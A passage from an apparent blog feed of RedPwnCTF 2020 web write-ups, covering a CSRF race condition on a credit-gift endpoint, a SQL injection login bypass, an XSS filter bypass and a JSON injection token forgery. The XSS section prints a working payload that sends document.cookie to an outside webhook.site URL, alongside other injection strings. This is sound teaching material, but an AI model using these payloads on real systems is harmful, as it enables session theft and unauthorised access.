            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
            <span style="color:#66d9ef">return</span>;
        }
        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">id</span>) {
            <span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">error</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Invalid token&#39;</span>;
            <span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">respondJSON</span>(<span style="color:#a6e22e">res</span>, <span style="color:#ae81ff">401</span>, <span style="color:#a6e22e">result</span>);
            <span style="color:#66d9ef">return</span>;
        }

        <span style="color:#75715e">// Make sure request is from admin
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">try</span> {
            <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">database</span>.<span style="color:#a6e22e">isAdmin</span>(<span style="color:#a6e22e">id</span>)) {
                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">writeHead</span>(<span style="color:#ae81ff">403</span>);
                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
                <span style="color:#66d9ef">return</span>;
            }
        } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">error</span>) {
            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">writeHead</span>(<span style="color:#ae81ff">500</span>);
            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
            <span style="color:#66d9ef">return</span>;
        }

        <span style="color:#75715e">// Get target user id from url
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">user_id</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">parseParams</span>(<span style="color:#a6e22e">req</span>).<span style="color:#a6e22e">id</span>;
        <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">user_id</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;string&#39;</span>) {
            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">writeHead</span>(<span style="color:#ae81ff">400</span>);
            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
            <span style="color:#66d9ef">return</span>;
        }

        <span style="color:#75715e">// Make sure user exists
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">try</span> {
            <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">database</span>.<span style="color:#a6e22e">getInfo</span>(<span style="color:#a6e22e">user_id</span>)) {
                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">writeHead</span>(<span style="color:#ae81ff">400</span>);
                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
                <span style="color:#66d9ef">return</span>;
            }
        } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">error</span>) {
            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">writeHead</span>(<span style="color:#ae81ff">500</span>);
            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
            <span style="color:#66d9ef">return</span>;
        }

        <span style="color:#75715e">// Make sure user has not already received a gift
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">try</span> {
            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">database</span>.<span style="color:#a6e22e">receivedGift</span>(<span style="color:#a6e22e">user_id</span>)) {
                <span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">respondJSON</span>(<span style="color:#a6e22e">res</span>, <span style="color:#ae81ff">200</span>, <span style="color:#a6e22e">result</span>); 
                <span style="color:#66d9ef">return</span>;
            }
        } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">error</span>) {
            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">writeHead</span>(<span style="color:#ae81ff">500</span>);
            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
            <span style="color:#66d9ef">return</span>;
        }

        <span style="color:#75715e">// Check admin password to prevent CSRF
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">body</span>;
        <span style="color:#66d9ef">try</span> {
            <span style="color:#a6e22e">body</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">parseRequest</span>(<span style="color:#a6e22e">req</span>);
        } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">error</span>) {
            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">writeHead</span>(<span style="color:#ae81ff">400</span>);
            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
            <span style="color:#66d9ef">return</span>;
        }

        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">password</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">password</span>;
        
        <span style="color:#66d9ef">try</span> {
            <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">database</span>.<span style="color:#a6e22e">checkPassword</span>(<span style="color:#a6e22e">id</span>, <span style="color:#a6e22e">password</span>)) {
                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">writeHead</span>(<span style="color:#ae81ff">401</span>);
                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
                <span style="color:#66d9ef">return</span>;
            }
        } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">error</span>) {
            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">writeHead</span>(<span style="color:#ae81ff">500</span>);
            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
            <span style="color:#66d9ef">return</span>;
        }

        <span style="color:#75715e">// Give user 10 credits
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">try</span> {
            <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">database</span>.<span style="color:#a6e22e">changeBalance</span>(<span style="color:#a6e22e">user_id</span>, <span style="color:#ae81ff">150</span>)) {
                <span style="color:#75715e">// How did we get here
</span><span style="color:#75715e"></span>                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">writeHead</span>(<span style="color:#ae81ff">500</span>);
                <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
                <span style="color:#66d9ef">return</span>;
            }
        } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">error</span>) {
            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">writeHead</span>(<span style="color:#ae81ff">500</span>);
            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
            <span style="color:#66d9ef">return</span>;
        }

        <span style="color:#75715e">// User can only receive one gift
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">try</span> {
            <span style="color:#a6e22e">database</span>.<span style="color:#a6e22e">setReceived</span>(<span style="color:#a6e22e">user_id</span>);
        } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">error</span>) {
            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">writeHead</span>(<span style="color:#ae81ff">500</span>);
            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
        }

        <span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">success</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
        <span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">respondJSON</span>(<span style="color:#a6e22e">res</span>, <span style="color:#ae81ff">200</span>, <span style="color:#a6e22e">result</span>);
    }]
</code></pre></div><p>The admin has the ability to gift a user some credits. This function is designed to only occur once, but we can fool the server into doing this several times with a race condition, as there is some time between the request being made and served, and when our &ldquo;recievedGift&rdquo; check changes.
The important filter to bypass is the fact that the function grabs the id from the user&rsquo;s token in order to verify that the request has actually been made by the admin. Since we don&rsquo;t have the admin token, we must forcethe admin to make the request without knowing - a CSRF attack.
We simply need to host a script on our server (that sends multiple requests at once) on the behalf of the admin to gift our account as many credits as we need. Going back to the URL submission, we send the admin the url of our server hosting that script, and when they visit - we can make the requests as needed with the admin&rsquo;s token. We should then recieve plenty of credits, and therefore purchase the flag for ourselves.</p>

    <img src="/images/REDPWN2020_Balance.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p><code>flag{n0_m0r3_gu3551ng}</code></p>
<h2 id="summary">Summary</h2>
<p>These were interesting problems that allowed me to explore some more unique web exploits! I still hope to discuss more redpwn problems, but nonetheless I wanted to share my writeups for the challenges that were incredibly enjoyable to do!</p>
<p>Jam</p>
]]></content>
        </item>
        
        <item>
            <title>RedPwnCTF 2020</title>
            <link>https://jamvie.net/posts/2020/06/redpwnctf-2020/</link>
            <pubDate>Thu, 25 Jun 2020 16:26:44 -0600</pubDate>
            
            <guid>https://jamvie.net/posts/2020/06/redpwnctf-2020/</guid>
            <description>RedPwnCTF 2020 is a beginner to intermediate CTF that&amp;rsquo;s accessible to high school and college students. The CTF featured a range of easy to harder problems, which provided both a good introduction into CTFs and an opportunity to stretch your pre-established skills. I solved through a good portion of the web problems, and will document a few of the ones here.
Let&amp;rsquo;s Begin! The problems are in no way ordered in terms of difficulty.</description>
            <content type="html"><![CDATA[<p>RedPwnCTF 2020 is a beginner to intermediate CTF that&rsquo;s accessible to high school and college students. The CTF featured a range of easy to harder problems, which provided both a good introduction into CTFs and an opportunity to stretch your pre-established skills. I solved through a good portion of the web problems, and will document a few of the ones here.</p>
<h2 id="lets-begin">Let&rsquo;s Begin!</h2>
<p>The problems are in no way ordered in terms of difficulty.</p>
<h3 id="login">login</h3>
<ul>
<li>points: 148</li>
</ul>

    <img src="/images/REDPWN2020_LoginPage.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>A simple login page - a sign for sql injection attacks. Consider the provided script:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">global</span>.<span style="color:#a6e22e">__rootdir</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">__dirname</span>;

<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>);
<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">bodyParser</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;body-parser&#39;</span>);
<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">cookieParser</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;cookie-parser&#39;</span>);
<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">path</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;path&#39;</span>);
<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">db</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;better-sqlite3&#39;</span>)(<span style="color:#e6db74">&#39;db.sqlite3&#39;</span>);

<span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;dotenv&#39;</span>).<span style="color:#a6e22e">config</span>();

<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>();

<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">bodyParser</span>.<span style="color:#a6e22e">json</span>({ <span style="color:#a6e22e">extended</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span> }));
<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">cookieParser</span>());

<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/api/flag&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">username</span>;
    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">password</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">password</span>;
    <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;string&#39;</span>) {
        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>);
        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
        <span style="color:#66d9ef">return</span>;
    }
    <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">password</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;string&#39;</span>) {
        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>);
        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
        <span style="color:#66d9ef">return</span>;
    }

    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">result</span>;
    <span style="color:#66d9ef">try</span> {
        <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">`SELECT * FROM users 
</span><span style="color:#e6db74">            WHERE username = &#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">username</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;
</span><span style="color:#e6db74">            AND password = &#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">password</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;;`</span>).<span style="color:#a6e22e">get</span>();
    } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">error</span>) {
        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({ <span style="color:#a6e22e">success</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>, <span style="color:#a6e22e">error</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;There was a problem.&#34;</span> });
        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
        <span style="color:#66d9ef">return</span>;
    }
    
    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">result</span>) {
        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({ <span style="color:#a6e22e">success</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>, <span style="color:#a6e22e">flag</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">FLAG</span> });
        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
        <span style="color:#66d9ef">return</span>;
    }

    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({ <span style="color:#a6e22e">success</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>, <span style="color:#a6e22e">error</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Incorrect username or password.&#34;</span> });
});

<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">express</span>.<span style="color:#66d9ef">static</span>(<span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">join</span>(<span style="color:#a6e22e">__dirname</span>, <span style="color:#e6db74">&#39;/public&#39;</span>)));

<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">PORT</span> <span style="color:#f92672">||</span> <span style="color:#ae81ff">3000</span>);

<span style="color:#75715e">// init database
</span><span style="color:#75715e"></span><span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">`CREATE TABLE IF NOT EXISTS users (
</span><span style="color:#e6db74">    id INTEGER PRIMARY KEY AUTOINCREMENT,
</span><span style="color:#e6db74">    username TEXT,
</span><span style="color:#e6db74">    password TEXT);`</span>).<span style="color:#a6e22e">run</span>();

<span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">`INSERT INTO 
</span><span style="color:#e6db74">    users (username, password)
</span><span style="color:#e6db74">    VALUES (&#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">USERNAME</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;, &#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">PASSWORD</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;);`</span>).<span style="color:#a6e22e">run</span>();

</code></pre></div><p>In the post request to api/flag, our username and password input are fed directly into the database, which is sqlite-based.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">   <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">result</span>;
    <span style="color:#66d9ef">try</span> {
        <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">`SELECT * FROM users 
</span><span style="color:#e6db74">            WHERE username = &#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">username</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;
</span><span style="color:#e6db74">            AND password = &#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">password</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;;`</span>).<span style="color:#a6e22e">get</span>();
    } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">error</span>) {
        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({ <span style="color:#a6e22e">success</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>, <span style="color:#a6e22e">error</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;There was a problem.&#34;</span> });
        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
        <span style="color:#66d9ef">return</span>;
    }
    
    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">result</span>) {
        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({ <span style="color:#a6e22e">success</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>, <span style="color:#a6e22e">flag</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">FLAG</span> });
        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
        <span style="color:#66d9ef">return</span>;
    }
</code></pre></div><p>Using the following credentials:</p>
<pre><code>username: admin
password:  ' OR '1==1
</code></pre><p>We malform the SQL query in the password field - including a tautology so the statement will return true. The resulting SQL will look like:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> users
    <span style="color:#66d9ef">WHERE</span> username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;admin&#39;</span>
    <span style="color:#66d9ef">AND</span> password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#66d9ef">OR</span> <span style="color:#e6db74">&#39;1==1&#39;</span>;
</code></pre></div>
    <img src="/images/REDPWN2020_LoginFlag.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<h3 id="static-pastebin">static-pastebin</h3>
<ul>
<li>points: 378</li>
</ul>

    <img src="/images/REDPWN2020_StaticPastebin.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>The site will take our input, feed it through a clean() function loaded from a script on the client-end, and then paste the &ldquo;cleaned&rdquo; text into an HTML div tag known as &ldquo;paste&rdquo;.</p>
<pre><code>function display(input) {
    document.getElementById('paste').innerHTML = clean(input);
}

function clean(input) {
    let brackets = 0;
    let result = '';
    for (let i = 0; i &lt; input.length; i++) {
        const current = input.charAt(i);
        if (current == '&lt;') {
            brackets ++;
        }
        if (brackets == 0) {
            result += current;
        }
        if (current == '&gt;') {
            brackets --;
        }
    }
    return result
}
</code></pre><p>Observe that clean() &ldquo;filters&rdquo; out potential xss attempts by removing anything within <code>&lt;&gt;</code> brackets. However, the function does this by consulting a <code>brackets</code> variable, which is expected to either take 0 or 1. However, the order of the if statements are important - if the first character is <code>&gt;</code>, then <code>brackets</code> will remain as 0 through the first and second if-statement checks - specifically on the 2nd check, <code>&gt;</code> is recorded. When it reaches the third, then <code>brackets</code> becomes -1. If the 2nd character after <code>&gt;</code> is <code>&lt;</code>, the opening angular bracket, the first check changes brackets back to 0 and <code>&lt;</code> is also recorded. Therefore, <code>&lt;&gt;</code> will not show in the page, but <code>&gt;&lt;</code> will. We can use this fact to smuggle our tags through - for every angular bracket, turn it into a <code>&gt;&lt;</code> pair.</p>
<p>The rest of the problem is a classic reflected xss attack. Using an HTML <code>img</code> attribute, grab the document cookie and have it sent to your server.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&gt;&lt;<span style="color:#f92672">img</span> 
    <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://this.isnt.a/real.site&#34;</span> 
    <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;fetch(
</span><span style="color:#e6db74">        &#39;https://webhook.site/31b4faf3-e6e6-44af-9d7d-196e18bcaed4&#39;, {
</span><span style="color:#e6db74">            method:&#39;POST&#39;, 
</span><span style="color:#e6db74">            body: JSON.stringify({data:document.cookie})
</span><span style="color:#e6db74">        }
</span><span style="color:#e6db74">    );&#34;</span>&gt;<span style="color:#960050;background-color:#1e0010">&lt;</span>
</code></pre></div><p>Input this, we will get a broken image, but inspecting the page will show that our <code>img</code> tag has sucessfully been interpreted as HTML. Additionally, we will get a ping on our server once the page loads. Report the URL of the page, and once the admin bot checks, we will get the flag sent to our server.</p>

    <img src="/images/REDPWN2020_StaticPastebinFlag.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<h3 id="panda-facts">Panda-Facts</h3>
<ul>
<li>points: 417</li>
</ul>

    <img src="/images/REDPWN2020_PandaFacts.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>Register and see some pretty anti-panda facts. At the bottom is a secret fact that will bar anyone who isn&rsquo;t a member. The challenge&rsquo;s provided script reveals the check:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">...

<span style="color:#a6e22e">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">generateToken</span>(<span style="color:#a6e22e">username</span>) {
    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">algorithm</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;aes-192-cbc&#39;</span>; 
    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">key</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">from</span>(<span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">KEY</span>, <span style="color:#e6db74">&#39;hex&#39;</span>); 
    <span style="color:#75715e">// Predictable IV doesn&#39;t matter here
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">iv</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">alloc</span>(<span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">0</span>);

    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">cipher</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">createCipheriv</span>(<span style="color:#a6e22e">algorithm</span>, <span style="color:#a6e22e">key</span>, <span style="color:#a6e22e">iv</span>);

    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`{&#34;integrity&#34;:&#34;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">INTEGRITY</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;,&#34;member&#34;:0,&#34;username&#34;:&#34;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">username</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;}`</span>

    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">encrypted</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
    <span style="color:#a6e22e">encrypted</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">cipher</span>.<span style="color:#a6e22e">update</span>(<span style="color:#a6e22e">token</span>, <span style="color:#e6db74">&#39;utf8&#39;</span>, <span style="color:#e6db74">&#39;base64&#39;</span>);
    <span style="color:#a6e22e">encrypted</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">cipher</span>.<span style="color:#66d9ef">final</span>(<span style="color:#e6db74">&#39;base64&#39;</span>);
    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">encrypted</span>;
}

<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/api/flag&#39;</span>, <span style="color:#a6e22e">async</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">cookies</span>.<span style="color:#a6e22e">token</span> <span style="color:#f92672">||</span> <span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">cookies</span>.<span style="color:#a6e22e">token</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;string&#39;</span>) {
        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({<span style="color:#a6e22e">success</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>, <span style="color:#a6e22e">error</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Invalid token&#39;</span>});
        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
        <span style="color:#66d9ef">return</span>;
    }

    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">decodeToken</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">cookies</span>.<span style="color:#a6e22e">token</span>);
    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">result</span>) {
        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({<span style="color:#a6e22e">success</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>, <span style="color:#a6e22e">error</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Invalid token&#39;</span>});
        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
        <span style="color:#66d9ef">return</span>;
    }

    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">member</span>) {
        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({<span style="color:#a6e22e">success</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>, <span style="color:#a6e22e">error</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;You are not a member&#39;</span>});
        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>();
        <span style="color:#66d9ef">return</span>;
    }

    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({<span style="color:#a6e22e">success</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>, <span style="color:#a6e22e">flag</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">FLAG</span>});
});

...
</code></pre></div><p>The member field for us is 0. However, observe that the generateToken() function feeds our username input unsanitized to be used by other functions.
If we make our username overwrite the first assignment to the member field, we can bypass the member check.</p>
<p>I inputted this as my username:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#960050;background-color:#1e0010">jam</span><span style="color:#e6db74">&#34;, &#34;</span><span style="color:#960050;background-color:#1e0010">member</span><span style="color:#e6db74">&#34;:1, &#34;</span><span style="color:#960050;background-color:#1e0010">ignore</span><span style="color:#e6db74">&#34;:&#34;</span>
</code></pre></div><p>This malforms the <code>token</code> variable into:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`{&#34;integrity&#34;:&#34;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">INTEGRITY</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;,&#34;member&#34;:0,&#34;username&#34;:&#34;jam&#34;, &#34;member&#34;:1, &#34;ignore&#34;:&#34;&#34;}`</span>
</code></pre></div><p>We overwrite the initial member assignment to the value we want.</p>
